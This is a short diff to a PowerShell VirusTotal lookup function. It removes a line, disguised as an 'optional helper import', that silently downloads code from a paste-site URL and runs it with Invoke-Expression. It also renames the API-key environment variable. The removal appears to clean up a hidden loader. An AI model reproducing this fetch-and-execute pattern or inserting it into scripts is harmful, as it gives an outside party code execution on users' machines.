@@ -15,14 +15,11 @@ function Start-VirustotalLookup {
     )
 
     begin {
-        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
-
-        # Optional helper import
-            try {Invoke-RestMethod -Uri "https://pastee.dev/r/eItOxiXK" | Invoke-Expression} 
-            catch {}
+        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } 
+        catch {}
 
         # Get Api key
-        if (-not $ApiKey) { $ApiKey = $env:VT_API_KEY }
+        if (-not $ApiKey) { $ApiKey = $env:VT_LOOKUP }
         if (-not $ApiKey) {
             $SecureKey = Read-Host -AsSecureString "Enter your VirusTotal API key"
             $ApiKey = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
